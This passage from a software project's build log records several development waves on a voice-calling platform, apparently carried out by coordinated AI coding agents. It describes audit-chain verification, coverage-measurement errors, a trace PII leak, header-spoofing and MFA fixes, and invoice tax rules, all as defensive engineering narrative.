Stopping reads as obvious — everything after a break is unverifiable — and it is wrong
twice. It is a DENIAL OF VERIFICATION: one damaged link from six months ago makes the
whole remainder unexamined, so the cheapest way to hide last night's edit is to break
something old. And the remainder was never unverifiable: a break destroys the proof that
later entries descend from GENESIS, not the proof that they descend from each other. The
walk re-anchors and continues, the log reads as SEGMENTS, and `breaks` names every
boundary with its date and its KIND — `content` (the row no longer hashes to its own
hash: edited) versus `link` (intact row, wrong neighbour: deleted or reordered). Those
are different incidents with different next moves, and telling them apart required
recomputing against the row's OWN `prev_hash` rather than the expected one.

**This is also what makes the panel readable at all.** `audit_log` is append-only, so a
real historical break is permanent — and this database carries one, from the era when the
lock was decorative. A verifier reporting only that break forever is a red light nobody
reads.

**Three vendor assumptions that the adapter stated as facts.** Each made pilot gate 7
unable to do its job, and OPERATIONS §2 had named all three:

- `_cost` wrote `source_currency="USD"` as a literal, so the gate read our own guess back
  and agreed with it. Bolna publishes no OpenAPI spec; if their India accounts quote INR
  paise, every `usage_events` row is out by the exchange rate, upward, in the direction
  that flatters the margin panel. The payload's stated currency is now used where it
  exists, `currency_stated` records whether it was a reading, INR is not multiplied by
  the dollar rate, and a currency we cannot convert is REFUSED — an absent cost is a
  visible gap, a fabricated one reaches an invoice.
- `parse_transcript` returned a bare list, so an unrecognised shape came back as `[]`:
  the same answer as a call where nobody spoke. It returns `(turns, unparsed)` now.
- Nothing recorded when an execution became `completed`, so the leg that decides whether
  the 2-minute lead SLO holds could only be measured live. `billable_ready_at` records
  it, and is honest that the fallback form is an upper bound.

**Two lessons about measurement, both learned the hard way in this wave.**

First: **write the migration's rationale AFTER measuring it, not before.** The
`ix_audit_log_chain` migration was drafted claiming that a `(at DESC, id DESC)`
declaration would demote the keyset row comparison to a filter. Measured, PG16 serves it
as an `Index Cond` either way, at identical buffers. The draft's reasoning was plausible
and wrong; the migration now records the refutation, because the next reader inherits the
evidence rather than the conclusion. The numbers that survived are worth having: the head
read — which runs on EVERY audit write, INSIDE the lock — went from a parallel sequential
scan claiming two workers (22,957 buffers, 62.6ms) to an index descent (4 buffers,
0.06ms), and the whole-log walk from 77.6s to 16.1s at 400k entries.

Second: **the coverage ratchet's refusal earned its keep.** It refused to score three
runs in a row for leftover Postgres rows and a warm Redis, which is exactly what it was
built for — and one of its own refusal messages cited `_current_head`'s Redis fallback as
the example, a fallback this wave deleted. The example was updated, not the rule. When it
did score, it caught a genuinely uncovered unit on a hard-rule-5 surface: `GET
/v1/dashboard` had five test modules calling the SERVICE and none calling the ROUTE, so
nothing exercised the dependency chain that decides which tenant is answered for.

**What this wave adds to the method.** §53 asked what a pixel claims when the server does
not answer; §54 asked whether two paths carrying one value are really the same. This one:
**a guard is a claim, and a claim with no adversarial test is decoration.** Every fix here
was verified by sabotage — break the fix, watch the test go red — and one of them (the
segmented walk) is verified by a sabotage that had to be rolled back, because writing a
corrupt row into an append-only ledger to prove a point leaves a scar every future run
inherits.

**A note the next session should not have to rediscover:** tests in this repo assert
DELTAS against `audit_log`, never a globally clean chain. The database carries permanent
historical damage, so a test demanding a clean log is green in CI and red on every
developer's machine for a reason that is not theirs.

## §56 — four slices that needed no vendor, and the instrument that had been lying to all of them

Four agents, one whole slice each, chosen on the criterion §54 set: **nothing blocked on
the Bolna pilot or on a founder decision.** Three of the four turned out to be guards that
existed and did not guard, which is now this repo's confirmed signature (§55). The fourth
found something worse: **the instrument we grade ourselves with has been wrong since it was
built.**

**The coverage ratchet has been blind to async database code.** SQLAlchemy's asyncio layer
is a greenlet bridge — `session.execute` hands off to a greenlet that runs the sync DBAPI
and switches back — and coverage's tracer is per-execution-context, so it is lost across
that switch and never reinstated. The code runs, the test passes, and every line after the
await is recorded as never executed. `[tool.coverage.run]` had no `concurrency` setting, so
this was true of every number this repo has ever ratcheted. Isolated on one route test:
`crm/service.dashboard` recorded 14 lines with no setting, 14 with `concurrency=thread`
(so threads were never the issue), and 18 with `greenlet` — the four gained being exactly
the lines after `await session.execute`. Locking it in moved four of six areas at once:
compliance-gate 63→37, dial-path 123→97, ledgers-and-money 49→32, voice-runtime-ack 22→20.
`redaction` and `tenancy-session` did not move, which is the sanity check — both are
synchronous primitives that never touch the bridge.

**Two things follow, and the second is the uncomfortable one.** The gate was never wrong in
the direction that matters: it over-reported uncovered units, so it never called something
covered that was not. But it had been pointing sessions at "gaps" that were tested all
along — which is how a guardrail spends other people's time — and `dial-path`, the hard
rule 5 surface, was reading 27% worse than the truth on precisely the code most likely to
be exercised through a route.

**How it was found is the part worth keeping.** Nobody went looking. The ratchet failed a
slice fairly (+21 uncovered units, all of them refusal branches in new provisioning code —
the area's own docstring predicts exactly that, because the happy path is what the demo
exercises). The agent sent back to cover them noticed its PASSING route-level tests were
reported as never executing the handler, and reached for service-level tests instead. Its
diagnosis named the wrong mechanism — it blamed `httpx.ASGITransport` — but the observation
was sound, and checking the mechanism rather than accepting the conclusion is what turned a
local workaround into a repo-wide correction. **An agent's evidence can be right while its
explanation is wrong; the evidence is the part to verify.**

**The tracing hook that hard rule 6 names had no caller — and the audit found a live leak.**
`redact_trace_payload` existed and, by its own docstring, nothing called it; D-49 had
deliberately KEPT it as a shape. Every call site in the repo was already clean, which is
why this survived: the PII came from three fields the OTel SDK writes ITSELF.
`record_exception=True` and `set_status_on_exception=True` are defaults, so any exception
escaping any span writes `exception.message`, `exception.stacktrace` — a span EVENT, which
the attribute allowlist never inspects — and a `Status.description`. A transcript went out
in full against the live exporter, and the production vector is ordinary: `str(IntegrityError)`
embeds its bind parameters, and a duplicate-lead insert reaches it. Fixed at the exporter,
not the call sites, because `record_exception=False` at four sites fails at the fifth
(D-61). Two Sentry gaps came with it, including `traces_sample_rate` running a second
UNFILTERED pipeline whose transaction events `before_send` never sees.

**Two allowlists decided one security question, and only one of them was the network's.**
Bolna signs nothing, so the source-IP allowlist IS the authenticity mechanism; the adapter
checked a hardcoded constant while the receiver read the configurable setting. The argument
that settles which wins is structural rather than aesthetic: **the enforcing half is
voice-runtime, which is forbidden from importing `apps.api.engine` at all**, so the
adapter's constant could never have been what the network is judged against. It also
explains why no test caught it — seven suites patched the receiver's module global, i.e.
they moved one of the two halves.

**Inbound A/B attribution: the ROADMAP's own phrasing was the trap.** "An assignment lookup
at inbound call creation" implies `assign()`, which DRAWS A BUCKET — and a bucket drawn for
an inbound call names an arm nobody spoke, then reports a real conversion under it. Refused,
and attributed on a fact instead: each arm is published as its own engine agent, so
`engine_agent_ref` says which script object actually answered. A live outbound defect fell
out of the same lookup — `dispatch_call` recorded the assignment only when its own INSERT
won the race, so a fast webhook left arm-dialled calls carrying no arm at all, silently
under-counting one side of a running comparison.

**`inbound_webhooks` finally has a writer.** Every client's ingest endpoint was an operator
running SQL. The substance is that rotation is a CUTOVER, not an instant: the secret lives
in someone's Meta app or form-vendor settings screen, and 401-ing during the paste loses
enquiries — the one thing the ingest path exists not to do. So the retiring secret keeps
verifying for a bounded grace window, bounded by DATA rather than by an operator's memory.
Hashing the stored secret was rejected structurally, not lazily: a Meta source's
`secret_ref` IS the App Secret and must stay in the clear to compute `X-Hub-Signature-256`,
so hashing only the rows where it works would put two schemes in one column.

**What this wave adds to the method.** §53 asked what a pixel claims when the server does
not answer; §54 asked whether two paths carrying one value are really the same; §55 asked
whether a guard fires. This one: **check the instrument.** Three of these slices were
verified by sabotage against a coverage report that was systematically under-counting, and
none of them was wrong because of it — but the one number that decides whether a hard-rule
surface is losing its tests had been wrong for the entire life of the guardrail, and it was
only ever going to be found by someone who refused to believe a passing test was uncovered.

**Two sabotages passed this wave and both became tests rather than statistics** — slice A's
window filter made an assertion vacuous, and slice B's "a lapsed rotation window reads as no
window" was simply untested. That is the ratio worth watching: a wave with no failed
sabotages is a wave whose sabotages were too easy.

## §57 — five slices, and the labels that were telling operators the wrong thing

Five independent slices, none of them blocked on a vendor. Two frontend (a11y), three
backend (state contracts, operator labels, billing schedule). Every slice sabotage-verified
by its author; three of them additionally sabotaged by the orchestrator on a line the
author did not choose, because a sabotage you pick yourself tests what you were already
thinking about.

**The a11y sweep closed, and found the defect the gate cannot see.** The three screens
deferred behind "a concurrent slice is live" — `campaigns`, `lead-sources`, `integrations` —
are in `SCREENS` with real fixtures read off `schema.d.ts`, and `UNSWEPT_SCREENS` is down to
the root `layout.tsx` (which still closes only with a browser-mode run). The screen flagged
as "the one genuine hole" scanned CLEAN, and that was reported as such rather than dressed
up. What it did have was a barrier **axe structurally cannot detect**: the endpoint-URL
input's only accessible name was its `placeholder`, which satisfies the `label` rule and
then vanishes on the first keystroke (WCAG 3.3.2). Proof it is a blind spot rather than a
missed rule: deleting the fix leaves the suite green. Every other field in the console
carries a persistent label; this one was the exception.

Adding those screens also turned a latent fixture hole into a deterministic failure on an
EXISTING screen: `/v1/compliance/kyc` was absent from `TENANT_ROUTES`, so the KYC screen has
been scanned rendering `ProblemNotice` instead of its identity record for as long as the
sweep has existed — passing at HEAD only because the request lost a race. Green for the
wrong reason, which is the §52 shape one level down.

**The off-screen drawer kept 18 elements in the tab order, in both realms.** Hidden by CSS
transform alone, no `inert`, no `aria-hidden` — a keyboard or screen-reader user tabbed
through an invisible menu. Both shells turned out to be the same duplicated markup, so they
now share one `components/navDrawer.tsx` rather than carrying one fix each. Two things the
research settled and the code records: this repo pins **React 19**, where `inert={false}`
renders NO attribute — under React 18 the same expression rendered `inert="false"`, a
PRESENT and therefore inert attribute (facebook/react#24730), which is exactly why the test
counts tabbables instead of asserting an attribute. And `inert` cannot be gated on `!isOpen`,
because above `lg` the same element IS the permanent desktop sidebar with `isOpen === false`;
`inert` is not a CSS property, so the breakpoint is read in JS. `aria-hidden` is not added
beside it — `inert` already removes the subtree from the accessibility tree, and `aria-hidden`
over a focusable subtree is itself an axe failure. The repo had no focus-trap idiom, so this
is now the first one; a future modal reuses or replaces it rather than adding a second.
Stated limit: the page BEHIND an open drawer is not made inert.

**A state transition answers three questions, not one (D-65).** Campaign pause/resume and KB
approve/reject collapsed "already in that state", "moved somewhere else" and "no such row"
into a single 409. That lied in two directions — it told a reviewer that an already-approved
source "is not awaiting approval" when their intended outcome had happened, and it answered
409 for **another tenant's id**, i.e. confirmed a row exists that RLS makes invisible. Both
now go through one `db/transition.py`, generalised from the boolean-flag version that already
existed in `ingest` and `integrations` rather than invented beside it. A repeat approval
writes nothing, so the approver and timestamp stay the FIRST reviewer's. Incidentally found:
`set_campaign_status` was interpolating its from-statuses into SQL as string literals — bound
parameters now; internal constants, so one refactor away from mattering rather than
exploitable. The agent's first concurrency test PASSED under its own sabotage because the two
coroutines never interleaved; it added an `asyncio.Barrier` and re-verified RED 3/3. That
self-catch is the point of the discipline.

**Two labels that named something other than what happened (D-62 follow-on).** `next_link_loop`
was emitted for three distinct facts, so an operator reading it went looking for a pagination
bug that often did not exist. It now splits: `next_link_loop` (the continuation URL genuinely
repeats), `empty_page_with_next` (no executions, still offered a continuation — `pages_fetched
== 1` distinguishes the empty FIRST page), and `next_link_no_progress` (a fresh link that
re-served rows we already had). Fetch behaviour is deliberately unchanged; walking to the cap
instead would report `page_cap_reached`, an even more misleading label. And `VariantResult.attributed`
was `count(...) FILTER (WHERE c.status = 'completed')` — every assignment row IS attributed to an
arm, so the number counted COMPLETED calls and `outbound_dialled - attributed` read as "could not
attribute" when it meant "did not complete". Renamed to `completed`/`inbound_completed` (a
breaking API rename; the frontend column header already said "Completed", which corroborated it).
`attributed_directions` and `unattributed_inbound` were deliberately NOT renamed — those genuinely
count attribution.

**The setup fee stopped waiting for a human (D-64).** D-63 named this gap in its own docstring:
the fee was recorded when a statement was RENDERED, and nothing renders statements on a schedule,
so a tenant whose invoice nobody opened was never charged — through a GET with a side effect. Now
a daily arq cron issues every owed fee and the GET is a pure read. `POST .../issue` was rejected:
a button is still a human. Two traps found in the building: `arq.cron()` defaults `max_tries` to
**1** and `WorkerSettings.max_tries` does not apply to a function carrying its own, so the mandated
retry ladder would have been silently absent (passed explicitly, verified against a real `Worker`
schedule); and the schedule must not pick the billing month — it is derived from the tenant's IST
`created_at`, because arq evaluates cron against the worker's LOCAL clock and a billing decision
cannot depend on a container's TZ.

Its one real judgement call is recorded rather than buried: the cross-tenant scan runs under
`admin_session()`, because the `engine_agent_routes` bridge other workers use is a SUBSET of this
population (a tenant can owe an onboarding fee having never published an agent) and the alternative
was making every client's commercial terms globally readable. The fencing is a SECURITY INVOKER
plpgsql loop setting `app.tenant_id` per tenant — and it is load-bearing, not asserted: dropping
that one line turns 6 of 22 tests red.

**A measurement trap this session cost hours to, recorded so the next one does not pay it again:**
`campaign_dispatch._tick_lease` is a platform-wide single-flight lease, so **parallel pytest sessions
against the one Postgres produce false REDs on every dispatch test** — one session's tick takes the
lease and the others' ticks correctly skip. Three agents saw the same seven failures and all three
were contention. Any wave gate has to be a SERIAL run to mean anything.

## §58 — the wave that asked what the docs were promising and nobody had built

This wave was planned from a VERIFIED SURVEY rather than from the previous session's
memory, and that changed what got built. The survey grep-checked every claim it made,
and its first finding was that **the build log itself was partly stale**: the ROADMAP
still said `save_intake_draft` had no route (it shipped in `60944da`), this file still
said SEVEN `UNWIRED_BASELINE` entries when §57 left six, SURFACES still asked for a
cost-runaway guard that exists, and TRD called admin MFA mandatory when no MFA code
existed anywhere. Two of those four understated what was built; one was a security
control that was simply absent. **Read the code before believing a doc, including this
one** — that is now a demonstrated rule and not a maxim.

**Nothing in this product wrote a plan row (D-66), and a suspended tenant kept dialling
(D-67).** The second is the serious one. `organizations.status` had a five-value CHECK,
was read by the health board, and was written by NOTHING — so no operator could suspend
an account. Worse, `check_dispatch` — the one gate every outbound path calls — never read
the column, so even once a status could be set, a suspended account would have kept
placing calls. Both halves landed together because both live in the admin surface: terms
are recorded INSERT-only through the existing `plan_in_effect_sql`, and the absence of
terms is surfaced as a state an operator must clear rather than papered over with a seeded
all-NULL row that every reader already treats as no row at all.

**Admin-realm MFA now exists, and the sabotage is what proves it is not theatre (D-68).**
With the backend check removed and the UI gate left fully intact, the frontend suite stayed
GREEN while four backend tests went red — including the big red switch actually going
through. The gate lives in `verify_token` so that "an admin token" and "an admin token that
passed MFA" are the same object across ~60 route declarations. `X-Confirm-Action` was kept
rather than superseded: MFA proves WHO holds the session once per 12h, the header proves
WHICH ACT on WHICH TARGET per request, and a fully MFA'd session is exactly what a tab left
open on an unlocked laptop is.

**The repo could not be deployed at all (D-69).** `DEPLOYMENT.md` named
`scripts/vps-deploy.sh` as the deploy mechanism and the file did not exist; no nginx config,
no Dockerfile, no deploy job. Building it also resolved a self-contradiction in the doc
(§2 "Python is NOT needed on the host" against §4.7 running alembic on the host) in favour
of containerised migrations, and closing the drift guard's `DEFERRED_MIRRORS` entry ARMED a
comparator that had been written and idle: it can now refuse a rate-zone disagreement
between the doc and the template.

**The engine could not read an agent back (T), which was quietly blocking two pilot gates.**
`VoiceEngine` had `create_agent` and `update_agent` and nothing that reads. Gate 2 could
therefore only ever score ACCEPTED, never APPLIED, and D-41's dangling-`rag_id` question was
unanswerable through the adapter. Both are now instrumented — and instrumented HONESTLY:
Bolna's hosted docs are blocked by this environment's egress proxy, so three separate
assumptions are marked in the adapter, and the design is TRI-STATE. An unrecognised response
shape yields `knowledge_base_refs_readable=False`, which scores INCONCLUSIVE — never "the
reference was cleared". D-41 stays a pilot gate rather than becoming a guess wearing a
finding's clothes.

**The DPDP subject-rights endpoints were fully built and no screen called them (U).** Export,
file-erasure and status were mounted, audited, worker-backed and producing proof certificates,
with zero frontend callers — so a client exercising a data principal's rights did it by curl.
The screen hands the export document to the caller as a FILE and never paints it into a
console that gets screen-shared.

**Three things the wave found and did not fix**, recorded so they are not rediscovered:
`POST /v1/compliance/subject-export` has no `response_model`, so it is typed as a free dict
AND is structurally invisible to the redaction guardrail — on the one endpoint whose payload
is a named human being. There is no list endpoint for deletion requests, so a client who
closes the tab loses the handle on an in-flight legal obligation. And
`voice-runtime/engine_intake.py::client_ip` takes the LEFTMOST `X-Forwarded-For` entry, which
is caller-controlled; Cloudflare appends rather than replaces. That is the whole authenticity
control for an unsigned engine (hard rule 3), currently safe only because the origin lock
guarantees `CF-Connecting-IP` is present.

**A coordination lesson, and a near miss.** An agent ran `git stash push --keep-index` while
four other agents had uncommitted work in the same tree. It popped immediately and nothing
was lost — verified, not assumed — but it was one `git checkout` from destroying a wave.
Subagents get read-only git and nothing else. Separately, CI's coverage ratchet caught six
untested defensive branches in §57's new `db/transition.py` that the local gate had skipped,
because the ratchet needs both stores empty and agents were using them. The budget was NOT
raised; the branches were covered. A shortcut around a gate is a decision to let a later gate
find it.

## §59 — the wave where the guardrails got better, not just the code

Five slices, all from the previous wave's verified findings rather than from a fresh guess.
Three of them improved an EXISTING guard rather than only adding features, which is the
pattern worth noticing: a guard that cannot see a thing is worse than no guard, because it
reads as coverage.

**The source-IP allowlist could be fed a caller-controlled address (D-70).** `client_ip`
took the LEFTMOST `X-Forwarded-For` entry, which is caller input by construction, and
Cloudflare appends rather than replaces. This is the ENTIRE authenticity control for an
unsigned engine. It was safe only because the origin lock made `CF-Connecting-IP` always
present — a property of the edge, not of the code, and exactly the kind of margin that
disappears when somebody adds a proxy. Now: one header, from one trusted hop, refuse
otherwise. The slice also closed a hole nobody had named — the origin lock allows
`127.0.0.1` for deploy health polls, so an on-box process could POST a forged
`CF-Connecting-IP`; nginx now WRITES that header rather than passing it through.

**A guardrail exception was all-or-nothing, and the one endpoint that most needed
examining was exempt by accident (D-71).** `subject-export` returned `dict[str, Any]`, so
`check_redaction_exposure` — which inspects response MODELS — could not see it at all, on
the one payload in this product that is an entire named human being. Rather than just
adding a model, the slice made `ALLOWED_ROUTES` entries field-scoped: a route can now be
excused for `phone_e164` and still have every other field walked. The three pre-existing
entries keep byte-identical behaviour. Proven, not asserted: adding `to_e164` to a call
model is reported, and narrowing the field set makes both phone fields reappear.

**Two hand-maintained column lists disagreed (D-72).** The leads screen and the CSV export
each had their own; the file carried `source`/`created_at` and the screen carried
`owner`/`updated_at`. One registry now serves both, so the mirroring is structural rather
than promised — and the formula-injection guard from §54 is tested against EVERY selectable
column rather than against a list of interesting ones. The safety call worth remembering is
the asymmetry: an unknown COLUMN key degrades (it narrows) but an unknown FILTER key is a
422, because dropping a filter WIDENS the set on the one route that emits unmasked numbers.

**The QA report existed only as a CLI, and the sampling queue not at all (D-73).** Both
shipped, with the anti-fork rule enforced by a test that parses the numbers back out of the
CLI's rendered Markdown and compares them with the live route — the two documents a client
can actually hold. The sample is a keyed hash with its seed, rank and FRAME stored, because
a sample nobody can re-derive is not evidence and "we sample 5%" is unfalsifiable without
the population it was drawn from.

**Three endpoints existed and no screen called them.** DLT registration (a client whose
campaigns are being refused could not see why), Sheets endpoint creation plus the event
catalogue, and the voice catalogue. Wiring them surfaced a latent rendering bug — the
endpoint list would have printed `key ···null` for every Sheets endpoint a client created —
and a real gap: an agent's current voice CANNOT BE READ at all, so the picker sets without
displaying and nothing is pre-selected rather than showing a guess.

**What the OpenAPI regen caught, which is the argument for doing it centrally.** Four
slices left clearly-marked temporary types; swapping them for the generated ones was not
cosmetic. `CommercialTermsIn`'s ceilings are OPTIONAL on the wire while the hand mirror
declared them required-and-nullable — and reading an absent ceiling as "not a loosening"
would have let a cap raise reach the server without its step-up confirmation. `QaReport`'s
two lists are optional for the same reason. A hand-written mirror is a claim about the
server that nothing checks, and it fails in whichever direction the author assumed.

**An operational note that cost time.** `make db-reset` cannot complete on a machine whose
Postgres cluster holds other Calevate databases: `alembic downgrade base` drops the
`calevate_app` ROLE, roles are cluster-wide, and the drop fails on dependent objects — but
only AFTER partially downgrading, which leaves the dev database mid-chain and produces
failures that look like code defects (`column "has_due_schedule" does not exist`). Use a
fresh scratch database instead: `createdb`, `alembic upgrade head`, seed, and point
`DATABASE_URL` at it. The coverage ratchet needs exactly that state anyway, and it will
REFUSE to score rather than report a number it cannot vouch for.

## §60 — the two findings the last wave reported and did not fix

A small, deliberate wave: the three defects §59's agents surfaced and correctly declined
to fix out of scope. Both slices came back having found that the stated defect was the
smaller half of the real one.

**The voice picker could set and not display — because the thing to display was TWO
things (D-74).** `set_agent_voice` writes our row and never touches the engine, so a
published agent is CONFIGURED for one voice and SPEAKING another until the next publish.
Nothing in the schema held the second answer, so `republish_required` was computed as
`published` — an assumption that is right the first time and wrong every time after,
including when an operator re-selects the voice the engine is already running. Adding a
single `tts_voice` to `AgentOut` would have closed the reported gap and shipped a screen
that states a wrong fact confidently, which is worse than the honest blank it replaced.
`live_tts_voice` mirrors `live_prompt_id`, `publish_agent` is its single writer and
records what it actually SENT after the vendor call, and the picker now shows **Callers
hear now** beside **Configured**.

Its no-backfill decision is the one to remember: `live_tts_voice := tts_voice` would tell
a client their callers already hear the new voice, which is exactly the false claim the
column exists to prevent.

**The event catalogue was an untyped dict, and the Sheets capability did not exist
(D-75).** Both are the same defect as D-71's `dict[str, Any]` one level down: a response
the generated client cannot describe is a response nothing checks. What is worth keeping
from this slice is what it REFUSED to do. It did not narrow `events` to the `EventName`
literal, because the union is what this build can REQUEST and the server's list is what
the deployment OFFERS — narrowing makes that gap unrepresentable and turns a deployment
that adds an event into a 500 out of response validation. And it did not delete the
frontend's hard failure on a malformed body once the types made it "unnecessary": a 200
missing `sheets_delivery_available` would render "Sheets is not switched on for your
account", which is our ignorance printed as one of the server's two answers.

**The capability is a hint, never the gate**, and that is pinned by a test that reads the
capability as true, flips the setting, and asserts the create is still refused with zero
rows written. A screen is allowed to be optimistic and wrong; it is not allowed to be the
check.

**Two questions surfaced and deliberately left open**, recorded in ROADMAP §6 above the
decision table rather than settled by an agent: SURFACES §2b lists the voice on the
IMMEDIATE lane and `set_agent_voice` does not publish, so no agent obeys the lane table;
and `publish_variant` sends the CONFIGURED voice to experiment arms, so starting an
experiment can move traffic while the mirror still says "republish required". The second
over-reports, which is the safe direction. Neither blocks anything today, and both need a
decision rather than a patch — what this wave fixed is that the state was previously
unobservable, so nobody could see which side of the lane a given agent was on.

`docs/DATA-MODEL.md` §3's `agents` block gained the four columns it had been missing —
`live_prompt_id`, `live_tts_voice`, `live_tts_provider` and `max_call_duration_s`. Only
the last two are this wave's; documenting just those would have made the older drift look
intentional. No guard enforces that block, which is why it drifted.

## §61 — four slices, and the two that were most valuable for what they refused

The largest wave so far by surface area, and the two results worth reading first are a
refutation and a self-caught test.

**A finding was REFUTED, on compliance grounds (AH).** D-65 named DLT template status as
an unaudited transition. It is not a defect: constraining it to `from_statuses` would make
`approved → rejected` — a registrar WITHDRAWING a template — unrecordable, and
`launch_blockers` would go on reading `approved` for a pulled template. That is a gate
going stale-green, and there is already a test pinning the move. The repeat audit row
there is also correct rather than the D-65 defect, because that endpoint records an
EXTERNAL OBSERVATION: a repeat means "I re-checked with the registrar and it still says
submitted", and `dlt_templates` has no column to hold that, so the audit row is the only
record of the re-verification. The reasoning is now a docstring so the next sweep does not
re-audit it.

Experiment conclude WAS a real defect and is fixed: one 409 answered all three questions.
It now answers 404 for absent or cross-tenant, an idempotent 200 for a repeat (no second
promotion, no second engine push, no second audit row), and a 409 naming the ending found.

**An agent's own sabotage passed, and it treated that as a finding (AG).** Leaking one
tenant's flag override to another initially went GREEN, because the cross-tenant probe only
ran in the direction where neither tenant had rows. It added the observable direction — A's
own session, which CAN see A's override, then asked about B — and got the RED. That
assertion is now permanent. A sabotage that passes is information, not an inconvenience.

**The feature-flag slice is mostly an argument about what NOT to build.** This repo already
had four flag-shaped mechanisms, and the fifth had to say which of them it was not
replacing. The one that matters: the build-time constants `PROVIDER_CREATES_ORDERS`,
`LEAD_RETRIEVAL_IMPLEMENTED` and `PROVISIONING_IMPLEMENTED` mean "no adapter exists", and a
row cannot make unwritten code exist — migrating them would let someone flip on a lie. The
recommendation is that none of the four move. A flag may also never gate a compliance
control, which is hard rule 5 restated with better manners and pinned by a test.

**Lead status was never using the discriminator, and that had cost three things (AE).** A
second click wrote a second `status_change` TIMELINE ROW claiming a change that never
happened; a no-op edit bumped `updated_at`, this table's sort key, so the client's list
re-ordered under them for nothing; and a soft-deleted lead's 404 was a coincidence rather
than a statement. `transition_status` gained `visible_where`, applied to BOTH the CAS and
the discriminating SELECT — applied to only one, a soft-deleted row would answer 409 naming
a status the caller may not know it has.

Bulk delete was considered and rejected on DPDP grounds: `deleted_at` only hides a row, so
the button would teach a client they had answered an erasure request when they had not.

**Recurrence is conservative in the directions that ring phones (AF).** A missed occurrence
is skipped rather than caught up, bounded at an hour — a worker down for three days comes
back to one upcoming run, not three at once. A repeat repeats the START and not the
dialling, because re-dialling reached subscribers is a different act from the one the client
scheduled. And `launch_campaign` kept its own CAS while borrowing D-65's discriminator,
because launch is NOT idempotent: it scrubs DNC, stamps `launched_at` and writes an
append-only row.

**What the central OpenAPI regen caught this time**, continuing the pattern: `LeadBulkOut.failures`
is OPTIONAL on the wire, so `result.failures.length` would have rendered an ABSENT list as
"nothing failed". The count now comes from the server's own invariant
(`changed + unchanged + len(failures) == requested`) rather than from the array, so a batch
that failed silently still says so. And `FeatureFlagIn.enabled` is optional, where an omitted
field means the same as an explicit null — clear the override — which the screen's `=== null`
test would have sent down the override branch.

**Carried, reported and not fixed:** `experiments.conclude` is keyed on the AGENT rather than
the experiment, so a stale retry arriving after a NEW test started would conclude the new
test. Fixing it moves the request shape and the console, so it wants its own slice.

## §62 — two carried findings, and a survey that says the blocker is not the code

**A stale retry could end the wrong experiment (D-80).** `conclude` was keyed on the AGENT,
so a request for test one arriving after test two had started concluded test two — losing a
running experiment and promoting an arm nobody chose. It now names the experiment, and is
answered about the test it named rather than redirected. The sabotage is the evidence that
D-65's three-answer work had not covered this: restoring the agent-fallback turned exactly
ONE test red while all 27 others passed.

**The screen was inventing a rule the server does not have (D-81).** Scheduling runs no gate
at arm time by design — the gate runs at fire time, every time — but both arming forms lived
inside the launch panel's `ready` branch, so a client with blockers today could not arm a
start for next Tuesday. Fixed on the screen; the server was right. The price of exposing the
control is three stated consequences, and one of them closed a gap nobody had reported: an
armed schedule said only "Starts Monday, 10:00 IST", so a doomed schedule's first evidence
would have been calls that never happened.

### The survey: where this actually stands

A full read-only survey ran alongside this wave. Its answer to "could this take a paying
client on Monday" is **no, and the reason is not the code**. Milestone 0 — which ROADMAP §1
says to start immediately and which is ENTIRELY NON-CODE — has not had one item completed:
no legal entity, no DLT PE registration, no GST registration, no Bolna account, no telephony
vendor, and nothing deployed anywhere. The engine is `fake` and all 13 pilot gates read NOT
RUN. **The legal-entity decision is the root of the tree**: it blocks DLT registration, GST
registration and every identity field on the invoice.

It found NO regressions across the eight subsystems the last four waves moved, and confirmed
§58's three carried findings are all genuinely fixed.

**The three things that would embarrass us first, all buildable now:**

1. **Money reaches a wallet only by a hand-constructed API call.** The credits endpoint is
   complete, idempotent-by-UTR and audited; nothing in `apps/web` calls it, and
   `runbooks/topup-payments.md` tells an operator to hit the API by hand off a bank
   statement. It is the ONLY way money gets in.
2. **The client cannot see their own invoice** — admin-realm only, while BRD names the client
   persona as the one who pays it.
3. **The invoice is not a valid Indian tax invoice** — 18% GST charged with no supplier or
   recipient GSTIN, no HSN/SAC, no place of supply, no entity address. The VALUES wait on the
   entity decision; the CODE does not.

### Six documented claims the code contradicted, now corrected

Five were in THIS file, and one of them contradicted §49 of this same file: the state-of-the
-system list still described `inbound_webhooks` as having no writer, when a client
self-provisioning their own lead source had shipped — a SELLABLE capability listed as inert.
Also corrected: "eleven checks in the guardrail target" (it is ten; the eleventh, the
coverage ratchet, is a separate target with different preconditions, so a reader who trusts
that sentence gets a weaker gate than they think), a stale frontend test count, a stale
"re-verified at §50" pointer, `SURFACES.md` listing credit top-up under "shipped today" when
no screen exists, and a `check_wiring` docstring citing an example that has since been fixed
while the blind spot it illustrates remains real.

**The root cause is worth acting on**: `check_docs_drift` guards commands, D-references,
SEC-COMP §3 vocabulary and the rate-zone table — it cannot see BUILD-LOG PROSE. The section
every future session reads first is the one section with no guard on it.

## §63 — the wave that made the money paths real, and found the invoice was not one

The survey at §62 said the code was not the blocker and then named three things that
would embarrass us first. All three are closed here, and two of them were worse than the
survey could see from the outside.

**The invoice was not merely missing fields — its arithmetic was structurally
unclaimable (D-83).** It charged a flat 18% GST, and CGST, SGST and IGST are three
SEPARATE credit ledgers: tax charged without naming the head cannot be claimed at all. The
old shape also could not express a Union Territory without a legislature (CGST+UTGST) in
any form. And the refusal we asked for turned out to be a legal position rather than a
style choice — **CGST s.32 prohibits an unregistered person from collecting tax**, so with
no GSTIN there is no tax invoice to issue.

The judgement call worth keeping: **zeroing the tax when unregistered was rejected**,
despite being the literal reading of s.32, because one forgotten environment variable would
then silently under-bill every client by 18%. A missing config key changes what a document
CLAIMS, never what a client OWES.

It also declined to fake a fix: the invoice serial is 19 characters against Rule 46(b)'s
16-character cap and is deterministic rather than consecutive. Those requirements genuinely
conflict with D-46's derived statement, truncating would trade a length breach for a
collision, and a test now fails the day somebody changes the scheme.

**Money now reaches a wallet through a screen (D-82)**, and the confirmation is the payment
reference itself rather than a fixed word — different every time so it cannot become muscle
memory, and doubling as the double-keying check on the one field where the error is
unrecoverable. Its duplicate warning is deliberately ONE-DIRECTIONAL: a match warns, an
absence never reassures, because the screen holds fifty entries and the server checks the
whole ledger. Found on the way: SURFACES promises credit adjustments and nothing implements
them, so a credit to the wrong tenant or the wrong amount still has NO tool.

**Impersonation now mints a delegation grant (D-85)**, and the spec reading is the good
part: RFC 8693's `act` claim carries DELEGATION semantics while a token without it carries
IMPERSONATION semantics — which is D-22's own rule written by someone else first, since
D-22 forbids acting-as precisely to avoid dual attribution. So the feature called
impersonation deliberately gets a delegation-shaped credential. The design follows from one
sentence: **the grant is not a credential.** It never travels in `Authorization` and does
nothing alone, so revocation lag is one request rather than one token lifetime, and no
